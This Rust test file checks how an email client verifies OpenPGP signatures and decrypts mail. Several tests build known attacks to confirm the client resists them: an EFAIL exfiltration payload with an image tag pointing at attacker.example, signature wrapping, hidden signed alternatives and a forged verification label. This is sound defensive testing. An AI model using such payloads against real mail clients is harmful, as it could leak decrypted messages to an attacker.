//! Signed and encrypted mail as the reading pane shows it: the verdict of the whole message and of each part, the
//! page the parts are drawn on, and the published attacks on mail clients (EFAIL's direct exfiltration, signature
//! wrapping, hidden parts, a painted frame), each made here with real keys.

use pe_core::keys::KeySource;
use pe_core::protect::Tone;
use pe_core::{Core, Options, PasswordStore};
use pe_store::{AccountSettings, Auth, Security, Store};

struct World {
    core: Core,
    dir: pe_testkit::TempDir,
    me: pe_pgp::Cert,
    alice: pe_pgp::SecretKey,
    mallory: pe_pgp::SecretKey,
}

fn now() -> i64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs() as i64
}

/// A store with the account me@example.org and its key, Alice's public key known, Mallory's not
fn world(name: &str) -> World {
    let dir = pe_testkit::TempDir::new(name);
    let path = dir.path().join("store.db");
    let account = {
        let store = Store::open(&path).unwrap();
        store
            .add_account(&AccountSettings {
                name: "Me".into(),
                email: "me@example.org".into(),
                username: "me@example.org".into(),
                imap_host: "imap.invalid".into(),
                imap_port: 993,
                imap_security: Security::Tls,
                smtp_host: "smtp.invalid".into(),
                smtp_port: 465,
                smtp_security: Security::Tls,
                auth: Auth::Password,
            })
            .unwrap()
    };
    let core = Core::open_with(
        &path,
        Options {
            passwords: PasswordStore::Memory,
            ..Default::default()
        },
        |_| {},
    )
    .unwrap();
    let mine = core.pgp_generate(account).unwrap();
    let me = pe_pgp::read_certs(core.pgp_export(&mine).unwrap().as_bytes())
        .unwrap()
        .remove(0);
    let alice = pe_pgp::generate("Alice", &["alice@example.org".into()], now() - 60).unwrap();
    let mallory = pe_pgp::generate("Mallory", &["mallory@example.net".into()], now() - 60).unwrap();
    core.pgp_import(alice.cert().armored().as_bytes(), None, KeySource::Paste)
        .unwrap();
    World {
        core,
        dir,
        me,
        alice,
        mallory,
    }
}

impl World {
    fn view(&self, raw: &str) -> pe_core::MessageView {
        let file = self.dir.path().join("message.eml");
        std::fs::write(&file, raw).unwrap();
        self.core.file_view(&file, false).unwrap()
    }
}

fn headers(from: &str, content_type: &str) -> String {
    format!(
        "From: {from}\r\nTo: me@example.org\r\nSubject: Test\r\nDate: Sun, 15 Nov 2026 10:00:00 +0000\r\n\
         Message-ID: <t@example.org>\r\nMIME-Version: 1.0\r\nContent-Type: {content_type}\r\n\r\n"
    )
}

fn text(body: &str) -> String {
    format!("Content-Type: text/plain; charset=utf-8\r\n\r\n{body}")
}

/// A multipart/signed entity (without top headers) of `content` signed by `key`, as `signed_part` returns it with
/// its own Content-Type line first
fn signed_part(content: &str, key: &pe_pgp::SecretKey, boundary: &str) -> String {
    let signature = pe_pgp::sign_detached(content.as_bytes(), key, now()).unwrap();
    format!(
        "Content-Type: multipart/signed; micalg={}; protocol=\"application/pgp-signature\"; boundary=\"{boundary}\"\r\n\r\n\
         --{boundary}\r\n{content}\r\n--{boundary}\r\nContent-Type: application/pgp-signature\r\n\r\n{}\r\n--{boundary}--\r\n",
        signature.micalg, signature.signature
    )
}

/// A whole message: the headers of `from` and the part `entity` (which starts with its own Content-Type line)
fn message(from: &str, entity: &str) -> String {
    let (first, rest) = entity.split_once("\r\n").unwrap();
    let content_type = first.strip_prefix("Content-Type: ").unwrap();
    let rest = rest.strip_prefix("\r\n").unwrap_or(rest);
    let mut out = headers(from, content_type);
    // continuation lines of the Content-Type stay with it
    out.push_str(rest);
    out
}

fn encrypted_part(inner: &str, to: &[&pe_pgp::Cert], signer: Option<&pe_pgp::SecretKey>, boundary: &str) -> String {
    let armored = pe_pgp::encrypt(inner.as_bytes().to_vec(), to, &[], signer, now()).unwrap();
    format!(
        "Content-Type: multipart/encrypted; protocol=\"application/pgp-encrypted\"; boundary=\"{boundary}\"\r\n\r\n\
         --{boundary}\r\nContent-Type: application/pgp-encrypted\r\n\r\nVersion: 1\r\n--{boundary}\r\n\
         Content-Type: application/octet-stream\r\n\r\n{armored}\r\n--{boundary}--\r\n"
    )
}

fn mixed(parts: &[String]) -> String {
    let mut out = String::from("Content-Type: multipart/mixed; boundary=\"mix\"\r\n\r\n");
    for part in parts {
        out.push_str("--mix\r\n");
        out.push_str(part);
        out.push_str("\r\n");
    }
    out.push_str("--mix--\r\n");
    out
}

fn tones(view: &pe_core::MessageView) -> Vec<Tone> {
    view.protection
        .as_ref()
        .unwrap()
        .parts
        .iter()
        .map(|part| part.tone)
        .collect()
}

#[test]
fn plain_mail_is_as_before() {
    let w = world("pgp-plain");
    let view = w.view(&message("alice@example.org", &text("Hello")));
    assert!(view.protection.is_none());
    assert!(!view.document.contains("<section class=\"pe-p"));
}

#[test]
fn signed_by_the_sender() {
    let w = world("pgp-signed");
    let raw = message(
        "Alice <alice@example.org>",
        &signed_part(&text("Hello Bob"), &w.alice, "s"),
    );
    let view = w.view(&raw);
    let protection = view.protection.as_ref().unwrap();
    assert_eq!(protection.tone, Tone::Good, "{protection:?}");
    assert!(
        protection.text.contains("Alice <alice@example.org>"),
        "{}",
        protection.text
    );
    assert!(!protection.encrypted);
    assert!(view.document.contains("Hello Bob"));
    // verified, it is green
    w.core
        .pgp_set_verified(&w.alice.fingerprint(), "alice@example.org", true)
        .unwrap();
    let view = w.view(&raw);
    assert_eq!(view.protection.as_ref().unwrap().tone, Tone::Verified);
}

#[test]
fn signed_by_someone_who_is_not_the_sender() {
    let w = world("pgp-other");
    let raw = message("Bob <bob@example.org>", &signed_part(&text("Hello"), &w.alice, "s"));
    let protection = w.view(&raw).protection.unwrap();
    assert_eq!(protection.tone, Tone::Warning);
    assert!(protection.text.contains("not the sender"), "{}", protection.text);
    // two From addresses: nobody is the sender
    let two = raw.replacen(
        "From: Bob <bob@example.org>",
        "From: alice@example.org, bob@example.org",
        1,
    );
    assert_eq!(w.view(&two).protection.unwrap().tone, Tone::Warning);
}

#[test]
fn changed_text_does_not_match() {
    let w = world("pgp-changed");
    let raw = message(
        "alice@example.org",
        &signed_part(&text("Pay Bob 10 euros"), &w.alice, "s"),
    );
    let changed = raw.replacen("Pay Bob 10 euros", "Pay Bob 99 euros", 1);
    let protection = w.view(&changed).protection.unwrap();
    assert_eq!(protection.tone, Tone::Warning);
    assert!(protection.text.contains("does not match"), "{}", protection.text);
}

#[test]
fn an_unknown_key() {
    let w = world("pgp-unknown");
    let raw = message("mallory@example.net", &signed_part(&text("Hi"), &w.mallory, "s"));
    let protection = w.view(&raw).protection.unwrap();
    assert_eq!(protection.tone, Tone::Neutral);
    assert!(protection.text.contains("not known"), "{}", protection.text);
}

#[test]
fn encrypted_and_signed() {
    let w = world("pgp-encrypted");
    let inner = text("The secret plan");
    let raw = message(
        "alice@example.org",
        &encrypted_part(&inner, &[&w.me], Some(&w.alice), "e"),
    );
    assert!(!raw.contains("secret plan"));
    let view = w.view(&raw);
    let protection = view.protection.as_ref().unwrap();
    assert!(protection.encrypted);
    assert_eq!(protection.tone, Tone::Good);
    assert!(protection.text.starts_with("Encrypted."), "{}", protection.text);
    assert!(protection.text.contains("Alice"), "{}", protection.text);
    assert!(view.document.contains("The secret plan"));
}

#[test]
fn encrypted_to_someone_else() {
    let w = world("pgp-nokey");
    let raw = message(
        "alice@example.org",
        &encrypted_part(&text("Not for you"), &[w.mallory.cert()], None, "e"),
    );
    let view = w.view(&raw);
    let protection = view.protection.as_ref().unwrap();
    assert_eq!(protection.tone, Tone::Warning);
    assert!(protection.text.contains("do not have"), "{}", protection.text);
    assert!(!view.document.contains("Not for you"));
}

#[test]
fn changed_ciphertext_is_not_shown() {
    let w = world("pgp-tampered");
    let raw = message(
        "alice@example.org",
        &encrypted_part(&text("Original"), &[&w.me], None, "e"),
    );
    // a character of the armored data changed, near its end (the encrypted data, not the headers)
    let end = raw.find("-----END PGP MESSAGE-----").unwrap();
    let at = raw[..end - 20].rfind(|c: char| c.is_ascii_alphanumeric()).unwrap();
    let mut changed = raw.clone().into_bytes();
    changed[at] = if changed[at] == b'A' { b'B' } else { b'A' };
    let view = w.view(&String::from_utf8(changed).unwrap());
    let protection = view.protection.as_ref().unwrap();
    assert_eq!(protection.tone, Tone::Warning);
    assert!(!view.document.contains("Original"));
}

#[test]
fn parts_signed_apart() {
    let w = world("pgp-mixed");
    let raw = message(
        "alice@example.org",
        &mixed(&[
            text("An unsigned note on top"),
            signed_part(&text("The signed contract"), &w.alice, "s"),
            text("-- \r\nSent through the list"),
        ]),
    );
    let view = w.view(&raw);
    assert_eq!(tones(&view), [Tone::Neutral, Tone::Good, Tone::Neutral]);
    let protection = view.protection.as_ref().unwrap();
    assert!(protection.text.contains("differently"), "{}", protection.text);
    assert_eq!(protection.parts[0].label, "Not signed");
    // three documents, each its own frame
    assert_eq!(view.document.matches("<iframe").count(), 3);
}

#[test]
fn efail_a_decrypted_part_can_not_be_wrapped_by_its_neighbours() {
    // direct exfiltration: an HTML part opens an image address, the encrypted part follows, an HTML part closes it
    let w = world("pgp-efail");
    let open = "Content-Type: text/html\r\n\r\n<img src=\"http://attacker.example/";
    let close = "Content-Type: text/html\r\n\r\n\">";
    let secret = encrypted_part(&text("The secret plan"), &[&w.me], None, "e");
    let raw = message("alice@example.org", &mixed(&[open.into(), secret, close.into()]));
    let view = w.view(&raw);
    assert_eq!(view.protection.as_ref().unwrap().parts.len(), 3);
    // the decrypted text is only ever inside its own frame's document, never next to the attacker's address
    let page = &view.document;
    let secret_at = page.find("The secret plan").unwrap();
    let frame_start = page[..secret_at].rfind("<iframe").unwrap();
    assert!(!page[frame_start..secret_at].contains("attacker.example"));
    // and no part of the page loads anything from the internet
    assert!(page.contains("img-src data:;"));
}

#[test]
fn a_signed_part_wrapped_in_someone_elses_message() {
    // Mallory forwards a part Alice once signed inside his own message: it is a part, not the message, and it is not
    // signed by the sender
    let w = world("pgp-wrapped");
    let old = signed_part(&text("I agree"), &w.alice, "s");
    let raw = message("mallory@example.net", &mixed(&[text("Alice says:"), old]));
    let view = w.view(&raw);
    assert_eq!(tones(&view), [Tone::Neutral, Tone::Warning]);
    assert!(
        view.protection.as_ref().unwrap().parts[1]
            .label
            .contains("not the sender")
    );
}

#[test]
fn a_signed_part_hidden_in_an_alternative() {
    // the signed part is the alternative the parser would not show: it never makes the shown text look signed
    let w = world("pgp-hidden");
    let alternative = format!(
        "Content-Type: multipart/alternative; boundary=\"alt\"\r\n\r\n--alt\r\n{}\r\n--alt\r\n{}\r\n--alt--\r\n",
        text("Pay Mallory"),
        signed_part(&text("Hello"), &w.alice, "s")
    );
    let raw = message("alice@example.org", &mixed(&[alternative, text("x")]));
    let view = w.view(&raw);
    assert!(
        tones(&view).iter().all(|tone| *tone == Tone::Neutral),
        "{:?}",
        tones(&view)
    );
}

#[test]
fn a_painted_label_is_only_the_messages_own_markup() {
    let w = world("pgp-painted");
    let fake = "Content-Type: text/html\r\n\r\n<section class=\"pe-p pe-v\"><a class=\"pe-l\" href=\"inboxclassic:part-0\">\
                Signed by Alice, key verified</a></section><p>Pay Mallory</p>";
    let raw = message(
        "alice@example.org",
        &mixed(&[fake.into(), signed_part(&text("Hi"), &w.alice, "s")]),
    );
    let view = w.view(&raw);
    let page = &view.document;
    // the page's own labels are two; the painted one is inside the first part's document only, escaped there
    assert_eq!(page.matches("<a class=\"pe-l\"").count(), 2);
    assert!(!page.contains("href=\"inboxclassic:part-0\">Signed by Alice, key verified"));
    // and the sanitizer kept no inboxclassic: link in the part
    assert!(!page.contains("inboxclassic:part-0&quot;"));
}

#[test]
fn inline_encrypted_and_inline_signed() {
    let w = world("pgp-inline");
    let armored = pe_pgp::encrypt(b"Inline secret".to_vec(), &[&w.me], &[], None, now()).unwrap();
    let raw = message("alice@example.org", &text(&format!("Before\r\n{armored}\r\nAfter")));
    let view = w.view(&raw);
    let protection = view.protection.as_ref().unwrap();
    assert_eq!(protection.parts.len(), 3, "{protection:?}");
    assert!(protection.parts[1].label.contains("Signature not checked"));
    assert!(view.document.contains("Inline secret"));
}

#[test]
fn protected_subject() {
    let w = world("pgp-subject");
    let inner =
        "Content-Type: text/plain; charset=utf-8; protected-headers=\"v1\"\r\nSubject: The real subject\r\n\r\nBody";
    let raw = message(
        "alice@example.org",
        &encrypted_part(inner, &[&w.me], Some(&w.alice), "e"),
    )
    .replacen("Subject: Test", "Subject: ...", 1);
    assert_eq!(w.view(&raw).subject, "The real subject");
}

#[test]
fn attachments_come_from_the_decrypted_part() {
    let w = world("pgp-attachment");
    let inner = mixed(&[
        text("See the file"),
        "Content-Type: application/pdf; name=\"plan.pdf\"\r\nContent-Disposition: attachment; filename=\"plan.pdf\"\r\n\
         Content-Transfer-Encoding: base64\r\n\r\nJVBERi0xLjQ="
            .into(),
    ]);
    let raw = message(
        "alice@example.org",
        &encrypted_part(&inner, &[&w.me], Some(&w.alice), "e"),
    );
    let view = w.view(&raw);
    assert_eq!(view.attachments.len(), 1);
    assert_eq!(view.attachments[0].filename, "plan.pdf");
}

#[test]
fn a_reply_quotes_what_was_shown_and_forwards_carry_the_decrypted_files() {
    let w = world("pgp-reply");
    let inner = mixed(&[
        text("The secret plan"),
        "Content-Type: application/pdf; name=\"plan.pdf\"\r\nContent-Disposition: attachment; filename=\"plan.pdf\"\r\n\
         Content-Transfer-Encoding: base64\r\n\r\nJVBERi0xLjQ="
            .into(),
    ]);
    // a part encrypted to someone else beside the one to me: never decrypted, never quoted
    let hidden = encrypted_part(&text("Not for you"), &[w.mallory.cert()], None, "h");
    let raw = message(
        "alice@example.org",
        &mixed(&[encrypted_part(&inner, &[&w.me], Some(&w.alice), "e"), hidden]),
    );
    let file = w.dir.path().join("reply.eml");
    std::fs::write(&file, &raw).unwrap();
    let accounts = w.core.accounts().unwrap();
    let reply = w
        .core
        .file_draft(&file, accounts[0].id, pe_core::DraftKind::Reply)
        .unwrap();
    let quoted = format!("{:?}", reply);
    assert!(quoted.contains("The secret plan"), "{quoted}");
    assert!(!quoted.contains("Not for you"));
    let forward = w
        .core
        .file_draft(&file, accounts[0].id, pe_core::DraftKind::Forward)
        .unwrap();
    assert_eq!(forward.attachments.len(), 1);
    assert_eq!(std::fs::read(&forward.attachments[0]).unwrap(), b"%PDF-1.4");
    // saved from the reading pane, the attachment is the decrypted one
    let (name, content) = w.core.file_attachment(&file, 0).unwrap().unwrap();
    assert_eq!((name.as_str(), content.as_slice()), ("plan.pdf", &b"%PDF-1.4"[..]));
}
